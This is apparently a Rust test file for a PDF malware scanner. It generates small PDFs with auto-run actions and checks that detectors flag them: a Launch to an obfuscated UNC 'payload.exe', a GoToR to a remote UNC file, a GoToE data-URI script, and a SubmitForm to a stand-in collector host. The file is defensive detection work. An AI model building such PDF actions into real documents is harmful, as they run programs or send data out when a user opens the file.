mod common;
use common::default_scan_opts;

fn build_pdf_with_objects(objects: &[&str]) -> Vec<u8> {
    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.4\n");
    let mut offsets = vec![0usize; objects.len() + 1];
    for object in objects {
        let obj_num = object
            .split_whitespace()
            .next()
            .and_then(|token| token.parse::<usize>().ok())
            .expect("object number");
        if obj_num < offsets.len() {
            offsets[obj_num] = pdf.len();
        }
        pdf.extend_from_slice(object.as_bytes());
    }
    let start_xref = pdf.len();
    let size = offsets.len();
    pdf.extend_from_slice(format!("xref\n0 {}\n", size).as_bytes());
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in offsets.iter().skip(1) {
        if *offset == 0 {
            pdf.extend_from_slice(b"0000000000 00000 f \n");
        } else {
            pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
        }
    }
    pdf.extend_from_slice(
        format!("trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n", size).as_bytes(),
    );
    pdf.extend_from_slice(start_xref.to_string().as_bytes());
    pdf.extend_from_slice(b"\n%%EOF\n");
    pdf
}

#[test]
fn detectors_flag_launch_external_program() {
    let bytes = include_bytes!("../../sis-pdf-core/tests/fixtures/launch_action.pdf");
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(bytes, default_scan_opts(), &detectors)
            .expect("scan");

    assert!(
        report.findings.iter().any(|f| f.kind == "launch_action_present"),
        "expected launch_action_present finding"
    );
    let external = report
        .findings
        .iter()
        .find(|f| f.kind == "launch_external_program")
        .expect("generic external launch finding");
    assert_eq!(external.meta.get("launch.target_type").map(String::as_str), Some("external"));
    assert!(
        external.meta.get("launch.target_path").map(|v| v.contains("calc.exe")).unwrap_or(false),
        "expected launch target to include calc.exe"
    );
}

#[test]
fn launch_action_records_normalised_obfuscated_target_metadata() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
        "4 0 obj\n<< /S /Launch /F (%255c%255cserver%255cshare%255cpayload.exe) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "launch_action_present")
        .expect("launch action finding");
    assert_eq!(
        finding.meta.get("injection.action_param_normalised").map(String::as_str),
        Some("true")
    );
    assert_eq!(finding.meta.get("action.param.source").map(String::as_str), Some("/F"));
    let decode_layers = finding
        .meta
        .get("injection.decode_layers")
        .and_then(|value| value.parse::<u8>().ok())
        .unwrap_or(0);
    assert!(decode_layers >= 2, "expected multi-layer normalisation");
}

#[test]
fn gotor_obfuscated_unc_target_is_flagged_as_suspicious_remote_target() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
        "4 0 obj\n<< /S /GoToR /F (%255c%255cserver%255cshare%255cpayload.pdf) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "action_remote_target_suspicious")
        .expect("suspicious remote target finding");
    assert_eq!(finding.meta.get("action.s").map(String::as_str), Some("/GoToR"));
    assert_eq!(
        finding.meta.get("action.remote.scheme").map(String::as_str),
        Some("\\\\server\\share\\payload.pdf")
    );
    assert!(
        finding
            .meta
            .get("action.remote.indicators")
            .map(|v| v.contains("unc_path") && v.contains("obfuscated_target"))
            .unwrap_or(false),
        "expected unc and obfuscation indicators"
    );
    assert_eq!(finding.meta.get("chain.stage").map(String::as_str), Some("egress"));
    assert_eq!(finding.meta.get("egress.channel").map(String::as_str), Some("remote_goto"));
    assert_eq!(finding.meta.get("egress.target_kind").map(String::as_str), Some("unc_path"));
    assert_eq!(
        finding.meta.get("egress.user_interaction_required").map(String::as_str),
        Some("false")
    );
}

#[test]
fn gotoe_data_uri_target_is_flagged_as_suspicious_remote_target() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
        "4 0 obj\n<< /S /GoToE /F (data:text/html,%3Cscript%3Ealert(1)%3C/script%3E) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "action_remote_target_suspicious")
        .expect("suspicious remote target finding");
    assert_eq!(finding.meta.get("action.s").map(String::as_str), Some("/GoToE"));
    assert_eq!(finding.severity, sis_pdf_core::model::Severity::High);
    assert!(
        finding
            .meta
            .get("action.remote.indicators")
            .map(|v| v.contains("data_uri") && v.contains("obfuscated_target"))
            .unwrap_or(false),
        "expected data URI and obfuscation indicators"
    );
    assert_eq!(finding.meta.get("chain.stage").map(String::as_str), Some("egress"));
    assert_eq!(finding.meta.get("egress.channel").map(String::as_str), Some("remote_goto"));
    assert_eq!(finding.meta.get("egress.target_kind").map(String::as_str), Some("data_uri"));
    assert_eq!(
        finding.meta.get("egress.user_interaction_required").map(String::as_str),
        Some("false")
    );
}

#[test]
fn benign_gotor_relative_target_does_not_trigger_suspicious_remote_target() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
        "4 0 obj\n<< /S /GoToR /F (chapter2.pdf) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan");

    assert!(
        !report.findings.iter().any(|f| f.kind == "action_remote_target_suspicious"),
        "relative target should not trigger suspicious remote target finding"
    );
}

#[test]
fn submitform_action_includes_egress_metadata() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
        "4 0 obj\n<< /S /SubmitForm /F (https://collector.example/submit) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan");
    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "submitform_present")
        .expect("submitform action finding");
    assert_eq!(finding.meta.get("chain.stage").map(String::as_str), Some("egress"));
    assert_eq!(finding.meta.get("chain.capability").map(String::as_str), Some("action_egress"));
    assert_eq!(finding.meta.get("egress.channel").map(String::as_str), Some("submit_form"));
    assert_eq!(finding.meta.get("egress.target_kind").map(String::as_str), Some("network_uri"));
    assert_eq!(
        finding.meta.get("egress.user_interaction_required").map(String::as_str),
        Some("true")
    );
}

#[test]
fn gotor_action_includes_egress_metadata() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
        "4 0 obj\n<< /S /GoToR /F (https://example.invalid/next.pdf) >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let detectors = sis_pdf_detectors::default_detectors();
    let report =
        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
            .expect("scan");
    let finding = report
        .findings
        .iter()
        .find(|f| f.kind == "gotor_present")
        .expect("gotor action finding");
    assert_eq!(finding.meta.get("chain.stage").map(String::as_str), Some("egress"));
    assert_eq!(finding.meta.get("chain.capability").map(String::as_str), Some("action_egress"));
    assert_eq!(finding.meta.get("egress.channel").map(String::as_str), Some("remote_goto"));
    assert_eq!(finding.meta.get("egress.target_kind").map(String::as_str), Some("network_uri"));
    assert_eq!(
        finding.meta.get("egress.user_interaction_required").map(String::as_str),
        Some("false")
    );
}
